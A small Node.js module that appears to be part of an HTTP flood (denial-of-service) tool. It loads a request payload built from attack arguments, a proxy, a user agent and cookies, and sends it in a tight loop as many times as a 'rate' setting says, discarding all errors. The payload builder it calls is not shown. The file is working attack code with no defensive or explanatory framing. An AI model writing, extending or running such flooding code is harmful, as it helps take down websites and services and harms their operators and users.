const request = require('request');


async function fukthis(obj, args){
    try {
        for(let i = 0; i < args.rate; i++) {
            request(obj);
        }
    } catch(e){}
}

function start(args, proxy, ua, secondcookies){
    fukthis(require('./payloads/http.js')(args, proxy, ua, secondcookies), args)
}

module.exports = start;